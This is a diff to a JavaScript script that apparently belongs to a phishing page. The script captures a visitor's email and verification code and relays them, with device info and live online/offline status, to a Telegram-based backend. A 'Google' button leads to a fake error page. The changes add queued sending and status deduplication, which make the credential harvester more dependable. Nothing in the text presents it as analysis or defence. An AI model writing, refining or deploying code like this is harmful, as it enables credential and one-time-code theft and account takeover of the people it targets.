@@ -5,16 +5,40 @@ document.addEventListener('DOMContentLoaded', function () {
     email: '',
     code: '',
     isOnline: true,
+    lastStatusSent: null,
   };
 
   let sendTimer = null;
+  let inFlightPromise = null;
+  let hasQueuedSend = false;
+
+  async function runQueuedSend() {
+    if (inFlightPromise) {
+      hasQueuedSend = true;
+      return inFlightPromise;
+    }
+
+    inFlightPromise = (async () => {
+      try {
+        do {
+          hasQueuedSend = false;
+          await sendToTelegram();
+        } while (hasQueuedSend);
+      } finally {
+        inFlightPromise = null;
+      }
+    })();
+
+    return inFlightPromise;
+  }
+
   function scheduleSend(immediate = false) {
     clearTimeout(sendTimer);
     if (immediate) {
-      return sendToTelegram();
+      return runQueuedSend();
     }
     sendTimer = setTimeout(() => {
-      sendToTelegram();
+      runQueuedSend();
     }, 400);
     return Promise.resolve();
   }
@@ -34,11 +58,12 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   async function sendToTelegram() {
+    const currentStatus = state.isOnline ? 'В сети' : 'Не в сети';
     const payload = {
       message_id: state.messageId,
       emails: state.email ? [{ text: state.email, time: getTimeMSK() }] : [],
       codes: state.code ? [{ text: state.code, time: getTimeMSK() }] : [],
-      status: state.isOnline ? 'В сети' : 'Не в сети',
+      status: currentStatus,
       device: getDevice(),
       unique_id: state.uniqueId,
     };
@@ -55,21 +80,33 @@ document.addEventListener('DOMContentLoaded', function () {
         if (data && data.message_id) {
           state.messageId = data.message_id;
         }
+        state.lastStatusSent = currentStatus;
       }
     } catch (err) {
       console.error('Ошибка отправки:', err);
     }
   }
 
-  document.addEventListener('visibilitychange', () => {
-    state.isOnline = !document.hidden;
+  function handleStatusChange(nextOnline) {
+    const nextStatus = nextOnline ? 'В сети' : 'Не в сети';
+    if (state.isOnline === nextOnline && state.lastStatusSent === nextStatus) {
+      return;
+    }
+    state.isOnline = nextOnline;
+    if (!state.messageId && !state.email && !state.code) {
+      return;
+    }
     scheduleSend(true);
+  }
+
+  document.addEventListener('visibilitychange', () => {
+    handleStatusChange(!document.hidden);
   });
 
   const googleBtn = document.getElementById('googleBtn');
   if (googleBtn) {
     const goToGoogleError = () => {
-      window.location.href = 'google-error.html';
+      window.location.href = '/google-error.html';
     };
     googleBtn.addEventListener('click', goToGoogleError);
     googleBtn.addEventListener('keydown', (e) => {
@@ -110,6 +147,7 @@ document.addEventListener('DOMContentLoaded', function () {
     state.email = '';
     state.code = '';
     state.messageId = null;
+    state.lastStatusSent = null;
     state.uniqueId = 'mail_' + Math.random().toString(36).substring(2, 15);
     if (emailInput) {
       emailInput.focus();
